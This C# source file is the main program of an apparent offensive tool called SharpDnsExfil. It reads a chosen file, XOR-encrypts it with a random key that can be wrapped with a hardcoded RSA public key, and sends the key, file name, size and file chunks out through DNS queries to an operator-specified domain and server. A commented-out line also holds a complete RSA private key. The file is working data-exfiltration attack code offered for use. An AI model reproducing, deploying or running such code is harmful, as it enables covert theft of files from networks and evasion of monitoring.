using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using CommandLine;
using SharpDnsExfil.Utils;

namespace SharpDnsExfil
{

    class Program
    {

        static void banner()
        {
            string help = @"
____  _   _ ____  _____       __ _ _ 
|  _ \| \ | / ___|| ____|_  __/ _(_) |
| | | |  \| \___ \|  _| \ \/ / |_| | |
| |_| | |\  |___) | |___ >  <|  _| | |
|____/|_| \_|____/|_____/_/\_\_| |_|_|
@ch4rm
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            banner();

            CommandLine.Parser.Default.ParseArguments<Options>(args)
             .WithParsed(RunOptions)
             .WithNotParsed(HandleParseError);

        }

        public static string xorKey = EncryptionUtils.GenerateRandomKey(10);

        public static readonly string SPubKey = @"<RSAKeyValue><Exponent>AQAB</Exponent><Modulus>1POCyvc01aGQEdruBOO/BA6Axa8HOAjhx3ZRXVrPRYbIuYc+2IrYeH1HpjOMg7P0Q0dUiVJXbwrnMCUwSRPcX4Dpo00z6OdVrtlBQ4VtHr/XTXsEhU1d3iK8VueR6/LcTPahKQdeXjTCbcTY7m8hJsAyo1iMjFO3cixU+vqchyVcs6ojpTWEgCihTxel2zEQl5h9j4oWWSKldA9oywRtTxDrD4a/RAzefjPwWSRHb19UFkwV5RYu11Fc2RB0ICw2Ezf3EPXxhtjhS+NIt2Hn+fP1sAZRACeoZqMls5smXyq3AKCYZdS/orwVHcE9h+5Dj1GQP/BkmaccfaPY/a1OGQ==</Modulus></RSAKeyValue>";
//<RSAKeyValue><Modulus>34fGGFCEFucJBGCOXCl4jqp0sAEyW+bH3c/mKEYJmKClcMPIXTaws+OiGpL0/B+5JdboXVnrOn/xAC3ET5lebGBktP5PmfyNk9O14FQOrfExRsW4eQM8X8f/k44XC9PlkQunEwB/5VwHBRG5i6nqi0sl8zuOLBsYzLiJgcaUF/c7mSU0Mi523mLX/QQuEwxdN95YXTYx/LnBL0cAb0cF3FHuh8k/C0k/1x99V2Z3HBZqEIsSgZ7FO2MacojTG3fYUWJZwmX9i782BTNOKMwrlFVI3FP8qz97tt/K+eQ4ViFG06j6wf2dNoGHPuAb1FlwBx1RFEdAS/JyfxnlneEmqQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        //public static readonly string SPrivKey = @"<RSAKeyValue><Modulus>34fGGFCEFucJBGCOXCl4jqp0sAEyW+bH3c/mKEYJmKClcMPIXTaws+OiGpL0/B+5JdboXVnrOn/xAC3ET5lebGBktP5PmfyNk9O14FQOrfExRsW4eQM8X8f/k44XC9PlkQunEwB/5VwHBRG5i6nqi0sl8zuOLBsYzLiJgcaUF/c7mSU0Mi523mLX/QQuEwxdN95YXTYx/LnBL0cAb0cF3FHuh8k/C0k/1x99V2Z3HBZqEIsSgZ7FO2MacojTG3fYUWJZwmX9i782BTNOKMwrlFVI3FP8qz97tt/K+eQ4ViFG06j6wf2dNoGHPuAb1FlwBx1RFEdAS/JyfxnlneEmqQ==</Modulus><Exponent>AQAB</Exponent><P>93h42xHMTEK2wMifpyBEYvEVFjKXGvB+bnZ4UgT/xZg59lIJRnMFaVrV/tchbmK8msHY9d36IfOU0K2z+8PsqhCJUxxbU56MacsLjXEniqx4u9ii8HiMQ2ex3a8ZTak5/YTLsB2wn/pRMlvGb7ZT5nRChQH2hCN/ehE+7jHQUYc=</P><Q>5zwRYpkRVcpe/tX5bKEl9zoa3OwuvKIUA8FcX8GCnt75l142WUVkHT/KG/5q16uZ1lg8CQgjMjty4/RgRgs9AxlOhMqm6hOucSz2DqyYaETPuzt+I4IdCXJa16ELJqPgBU3f+DkuASDWElNQOH+wkiTNRyFwMmXMS96aURlfkk8=</Q><DP>0P4h+siuI11YH7mO80KR3olBSKzS5gJilAFjHclxBDvJ/5dKk/+Be3cmMIEYj7O9GmlJRGMB4nhmnlGEJcRR81Hh15mkGxtT8+hxSjNctIVxtRqAiNsVgbtqABDnKqoW+l6S8powVvq8Ze4RyLhPZNmcb923heLAvqMf5WOWTbM=</DP><DQ>2FWoZjiSsVLOIVkLLAhwPqaL71jAORbh5smGpMekbwJpPKaV7lsvWPYPHrWeO/x9xr1yHXkRhLN9v6soTx/Aix+oCDCYjLKxJ41K/1uWkyaduqvkTVAz3lywhMBUcGgs9IlxGwhT9BZGcYqkqNc92Ny5eOzdzSjUQ78VXP6CHZ0=</DQ><InverseQ>zrGBdorsRy5fapag3vK8Cj7y1NMcipPoIGWFhESJFyf0y1JXN2jfOPj+jfPVINXYOA3Udyygf6SxUXtrgoiyeyPG7tI9N8NrV/tiQQ+GaAExeRYyFiHplaUx8Nryja/Qhn+xI5A3iVGm5eq5si+EOIf2MjG5T4qqh3mamTUN28E=</InverseQ><D>VsQeOcvvKfCuSFuuhsm2OTKjLrqYMKIpTMlpXpKpIOyiq13jxYL4Hiuq/cOzgrZRqQV9ltbTfxawltAtFnTC+TCFhtf8UBp/XjVcsOIP/KbV6NHQ5HBEHC3G4CDUg0vSHXY3eSHFg2MwemBB9JuVJlKaPYsNicNO4hBzl8NcMtyUHUyliyruIPxbDDNouO05X8/GDvGPtwrhFR3yuIHy4AxlrOSHyqR7A6eythLa3ap52jlFLSSWnCRSJhNJXyQsjiGufFmA288LhNiYcr9gsLHGMH7KYdk6AY+SJh0A3DxMwlGSj3AsjfWARs38qiXzEW3//3w5HSyTaNvAc/LIrQ==</D></RSAKeyValue>";

        public static void RunOptions(Options opts)
        {
            var filePath = opts.FilePath;
            Utilities utils = new Utilities();
            RSA RSAEnc = new RSA();

            int currentByte = 0;
            int oldPercent = 0;
            long totalSize = utils.GetFileSize(opts.FilePath);
            var fileName = Path.GetFileName(opts.FilePath);

            if (!File.Exists(filePath))
            {
                Console.WriteLine("[!] File not exist", opts.Verbose);
                return;
            }

            if(opts.Encrypt)
            {
                string xorKeyEncoded = RSAEnc.Encrypt(xorKey, SPubKey);
                Logger.WriteLine($"Encrypted key generated: {xorKeyEncoded}", opts.Verbose);

                foreach (var str in utils.SplitString(xorKeyEncoded))
                {
                    utils.Exfiltrate(Encoding.UTF8.GetBytes("XEnc:::" + str), opts.Domain, opts.Server, opts.Verbose, false);
                }
            }
            else
            {
                utils.Exfiltrate(Encoding.UTF8.GetBytes("XOR Key:::" + xorKey), opts.Domain, opts.Server, opts.Verbose, false);
            }

            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + fileName), opts.Domain, opts.Server, opts.Verbose);

            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Size:::" + totalSize), opts.Domain, opts.Server, opts.Verbose);

            foreach (var chunk in utils.ReadFileChunks(filePath))
            {
                currentByte += chunk.Length;
                int percent = (int)(0.5f + ((100f * currentByte) / totalSize));

                if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
                    Console.WriteLine($"Uploading to {opts.Domain} - {percent}% transfered");
                oldPercent = percent;
                
                utils.Exfiltrate(chunk, opts.Domain, opts.Server, opts.Verbose);
            }
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {
        }
    }
}
